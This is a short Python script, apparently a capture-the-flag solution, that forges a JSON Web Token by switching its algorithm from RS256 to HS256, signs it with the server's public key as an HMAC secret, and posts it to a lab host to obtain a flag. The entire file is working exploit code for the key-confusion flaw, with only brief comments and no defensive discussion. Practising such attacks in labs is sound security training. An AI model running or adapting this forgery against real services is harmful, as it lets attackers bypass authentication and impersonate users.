# Grab a JWT token off a site, change the header from RS256 to HS256, sign the new token with public key, and send a POST request to get the flag

import jwt,subprocess,base64
import requests
from bs4 import BeautifulSoup
import json

url='http://10.10.119.204'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')

token = soup.find('xmp').getText().split(" ")[1].rstrip("\n")
#token = bytes(token, 'utf-8')
token += ('=' * (-len(token) % 4))
token = token.rstrip("\n")
decoded_token = base64.b64decode(token)
payload = json.loads(decoded_token[27:103])
print(f'payload : {payload}')
#pub key
public = open('public.pem','r').read()
#print(public)

lst=[]
data = jwt.encode(payload,key=public, algorithm='HS256').decode('utf-8')
data=data.split(".")
data=data[0]+'.'+data[1]
lst.append(data)
translated = subprocess.Popen('cat public.pem | xxd -p | tr -d "\\n"',shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()
translated = translated[0].decode('utf-8')
lst.append(translated)
signature_hex = subprocess.Popen('echo -n '+lst[0]+' | openssl dgst -sha256 -mac HMAC -macopt hexkey:'+lst[1],shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()
signature_hex = (signature_hex[0].decode('utf-8').split(" ")[1])

#get base64
import base64, binascii
#print(base64.urlsafe_b64encode(binascii.a2b_hex(signature_hex.strip())))
final_res = lst[0]+"."+base64.urlsafe_b64encode(binascii.a2b_hex(signature_hex.strip())).decode('utf-8')
final_res = final_res.rstrip('=')
print(final_res)
data = {'jwt' : final_res}
r = requests.post(url=url, data=data)
print(r.text)

